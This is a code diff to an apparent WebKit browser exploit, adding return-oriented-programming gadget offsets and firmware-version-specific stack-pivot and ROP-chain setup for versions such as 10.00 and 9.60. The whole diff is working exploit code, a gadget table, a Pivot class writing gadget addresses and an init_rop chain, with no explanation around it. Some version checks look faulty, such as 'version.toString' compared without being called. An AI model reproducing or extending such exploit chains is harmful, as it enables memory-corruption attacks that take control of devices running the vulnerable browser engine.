@@ -211,6 +211,12 @@ const gadgets = {
   get MOV_RAX_RCX_RET() {
     return webkit_base + Offsets.current.wk_MOV_RAX_RCX_RET;
   },
+  get MOV_RAX_RSI_RET() {
+    return webkit_base + Offsets.current.wk_MOV_RAX_RSI_RET;
+  },
+  get PUSH_RBP_POP_RSI_RET() {
+    return webkit_base + Offsets.current.wk_PUSH_RBP_POP_RSI_RET;
+  },
   get MOV_QWORD_PTR_RDI_RAX_RET() {
     return webkit_base + Offsets.current.wk_MOV_QWORD_PTR_RDI_RAX_RET;
   },
@@ -240,6 +246,9 @@ const gadgets = {
   },
   get PUSH_RSI_JMP_QWORD_PTR_RAX() {
     return webkit_base + Offsets.current.wk_PUSH_RSI_JMP_QWORD_PTR_RAX;
+  },
+  get PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_28() {
+    return webkit_base + Offsets.current.wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_28;
   },
   get MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38() {
     return webkit_base + Offsets.current.wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38;
@@ -414,10 +423,17 @@ class Pivot {
     this.view = new DataView(new ArrayBuffer(0x48));
 
     this.view.setBigUint64(0, gadgets.POP_RSP_RET, true);
-    this.view.setBigUint64(0x8, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
-    this.view.setBigUint64(0x18, gadgets.PUSH_RSI_JMP_QWORD_PTR_RAX, true);
-    this.view.setBigUint64(0x20, gadgets.MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18, true);
-    this.view.setBigUint64(0x38, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8, true);
+    if (version.toString() == "10.00"){ // because of gadgets i didnt find
+      this.view.setBigInt64(0x18, gadgets.PUSH_RSI_JMP_QWORD_PTR_RAX, true);
+      this.view.setBigInt64(0x28, gadgets.MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18, true);
+      this.view.setBigInt64(0x38, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40, true);
+      this.view.setBigInt64(0x40, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_28, true);
+    } else {
+      this.view.setBigUint64(0x8, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
+      this.view.setBigUint64(0x18, gadgets.PUSH_RSI_JMP_QWORD_PTR_RAX, true);
+      this.view.setBigUint64(0x20, gadgets.MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18, true);
+      this.view.setBigUint64(0x38, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8, true);
+    }
   }
 
   get addr() {
@@ -1391,8 +1407,16 @@ function init_rop() {
   rop.stack = new Stack(0x2000);
   rop.frame = new Frame(["rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);
 
-  rop.insts.push(gadgets.PUSH_RBP_POP_RAX_RET);
-  rop.insts.push(gadgets.MOV_RAX_RCX_RET);
+  if (version.toString() == "10.00"){
+    rop.insts.push(gadgets.PUSH_RBP_POP_RSI_RET);
+    rop.insts.push(gadgets.MOV_RAX_RSI_RET);
+  } else if (version.toString() == "9.60" || version.toString == "9.50" || version.toString == 9.51){
+    rop.insts.push(gadgets.PUSH_RBP_POP_RSI_RET); // todo
+    rop.insts.push(gadgets.MOV_RAX_RCX_RET);
+  } else {
+    rop.insts.push(gadgets.PUSH_RBP_POP_RAX_RET);
+    rop.insts.push(gadgets.MOV_RAX_RCX_RET);
+  }
 
   rop.frame.store(rop.insts, "rsp");
 
